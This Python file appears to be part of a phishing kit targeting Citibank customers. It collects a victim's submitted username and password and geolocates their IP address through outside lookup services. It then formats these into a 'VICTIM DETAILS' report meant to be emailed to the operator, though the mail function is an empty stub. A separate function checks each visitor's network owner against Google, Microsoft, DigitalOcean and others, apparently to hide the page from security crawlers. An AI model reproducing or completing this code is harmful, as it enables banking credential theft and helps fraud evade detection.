import os
from datetime import datetime
import requests
from timezonefinder import TimezoneFinder


def get_nearest_timezone(latitude, longitude):
    # Create an instance of TimezoneFinder
    tz_finder = TimezoneFinder()

    # Get the timezone based on latitude and longitude
    timezone = tz_finder.timezone_at(lng=longitude, lat=latitude)
    return timezone

def get_time_zone_from_ip_address():
    # Get the client's IP address
    client_ip_address = get_client_ip()

    # Make an API request to get geolocation information based on the IP address
    url = f'http://www.geoplugin.net/php.gp?ip={client_ip_address}'
    response = requests.get(url)

    if response.status_code == 200:
        client_information = response.json()

        # Extract the relevant information from the response
        clients_latitude = client_information.get('geoplugin_latitude')
        clients_longitude = client_information.get('geoplugin_longitude')
        clients_country_code = client_information.get('geoplugin_countryCode')
        clients_country_name = client_information.get('geoplugin_countryName')
        clients_region_code = client_information.get('geoplugin_regionCode')
        clients_region_name = client_information.get('geoplugin_regionName')

        # Get the nearest timezone based on latitude and longitude
        time_zone = get_nearest_timezone(clients_latitude, clients_longitude)

        # Return the timezone and other location details as a tuple
        return (time_zone, clients_region_code, clients_region_name, clients_country_name, clients_country_code)
    else:
        return None




def get_ip1(ip):
    url = f"http://www.geoplugin.net/json.gp?ip={ip}"
    response = requests.get(url)
    return response.json()

def get_ip2(ip):
    url = f"http://extreme-ip-lookup.com/json/{ip}"
    response = requests.get(url)
    return response.json()



def get_client_info(ip):
    details = get_ip1(ip)
    country_name = details.get('geoplugin_countryName', '')
    country_code = details.get('geoplugin_countryCode', '')
    continent = details.get('geoplugin_continentName', '')
    city = details.get('geoplugin_city', '')
    region = details.get('geoplugin_region', '')
    timezone = details.get('geoplugin_timezone', '')
    currency = details.get('geoplugin_currencySymbol_UTF8', '')
    
    details2 = get_ip2(ip)
    isp = details2.get('isp', '')
    lat = details2.get('lat', '')
    lon = details2.get('lon', '')
    ip_type = details2.get('ipType', '')
    ip_name = details2.get('ipName', '')
    
    return {
        'country_name': country_name,
        'country_code': country_code,
        'continent': continent,
        'city': city,
        'region': region,
        'timezone': timezone,
        'currency': currency,
        'isp': isp,
        'lat': lat,
        'lon': lon,
        'ip_type': ip_type,
        'ip_name': ip_name
    }

def log_details(ip, user_agent, username, password, client_name):
    details = get_client_info(ip)
    country_name = details['country_name']
    country_code = details['country_code']
    continent = details['continent']
    city = details['city']
    region = details['region']
    timezone = details['timezone']
    isp = details['isp']
    lat = details['lat']
    lon = details['lon']
    ip_type = details['ip_type']
    ip_name = details['ip_name']
    
    os = get_os(user_agent)
    browser = get_browser(user_agent)
    
    date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
    time = datetime.now().strftime("%H:%M:%S")
    
    message = f"""
    [🍁 SNEL ROI | CITI BANK | CLIENT :{client_name} 🍁]
    
    ********** [ 💻 USER DATA DETAILS 💻 ] **********
    # USERNAME   : {username}
    # PASSWORD   : {password}
    
    ********** [ 🌍 BROWSER DETAILS 🌍 ] **********
    # USERAGENT  : {user_agent}
    # BROWSER    : {browser}
    
    ********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********
    # IP ADDRESS : {ip}
    # LONGITUDE  : {lon}
    # LATITUDE   : {lat}
    # CITY(IP)   : {city}
    # TIMEZONE   : {timezone}
    # HOSTNAME   : {ip_name}
    # IP TYPE    : {ip_type}
    # COUNTRY    : {country_name}, {country_code}
    # REGION     : {region}
    # DATE       : {date}
    # TIME       : {time}
    # ISP        : {isp}
    **********************************************
    """
    
    # Send email (example using SMTP in Python)
    if settings['send_mail'] == "1":
        send_email(client_name, message)

def send_email(client_name, message):
    # Send mail (this is just a placeholder; implement with an actual email-sending method)
    pass



def check_ip_is_bot(ip):
    url = f"https://rdap.arin.net/registry/ip/{ip}"
    
    try:
        # Send GET request to RDAP API
        response = requests.get(url)
        response.raise_for_status()  # Will raise an exception if the HTTP request failed
        
        # Extract the name from the response JSON
        data = response.json()
        name = data.get("name", "").upper()

        # List of known bad names (bot-related providers)
        bad_names = ["GOOGLE", "DIGITALOCEAN", "RIPE", "APNIC", "MSFT", "QUADRANET"]

        # Check if the name is in the bad names list
        if any(bad_name in name for bad_name in bad_names):
            return "is_bot"
        else:
            return "is_human"
    
    except requests.exceptions.RequestException as e:
        # If there's an error with the request (like connection issues), handle it
        print(f"Error: {e}")
        return "unknown"
